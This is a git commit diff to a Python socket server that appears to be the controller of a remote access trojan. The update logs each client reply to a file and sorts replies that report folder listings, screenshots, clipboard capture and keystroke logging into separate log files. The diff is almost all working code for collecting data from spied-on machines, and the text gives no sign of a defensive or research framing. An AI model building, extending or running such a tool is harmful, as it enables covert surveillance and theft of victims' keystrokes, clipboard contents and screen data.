e84bbd9ae385bda3cb4d4c90d1a15b5247132d21
Paranomic vibes <91229775+paranomicvibes@users.noreply.github.com>
2023-12-11 20:46:45 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,9 @@
 import socket
+import os
+
+def save_to_file(data, filename):
+    with open(filename, 'a') as file:
+        file.write(data + '\n')
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -14,8 +19,32 @@ def main():
         client_socket.send(command_to_send.encode())
 
         # Receive and display the response from the client
-        response = client_socket.recv(4096)
-        print(f"Received response from client: {response.decode()}")
+        response = client_socket.recv(4096).decode()
+        print(f"Received response from client: {response}")
+
+        # Save everything to a file
+        save_to_file(response, 'server_log.txt')
+
+        # Handle "get" command
+        if command_to_send.startswith("get"):
+            if response.startswith("List of folders:"):
+                print("Received list of folders:")
+                print(response[response.find(':') + 1:])
+                save_to_file(response, 'folders_log.txt')
+            elif response.startswith("Screenshot saved at"):
+                print(response)
+                save_to_file(response, 'screenshot_log.txt')
+                # You can add further processing for screenshots if needed
+            elif response.startswith("Clipboard data saved."):
+                print(response)
+                save_to_file(response, 'clipboard_log.txt')
+                # You can add further processing for clipboard data if needed
+            elif response.startswith("Key strokes logging started."):
+                print(response)
+                save_to_file(response, 'keystrokes_log.txt')
+                # You can add further processing for key strokes logging if needed
+            else:
+                print(response)
 
     client_socket.close()
     server_socket.close()
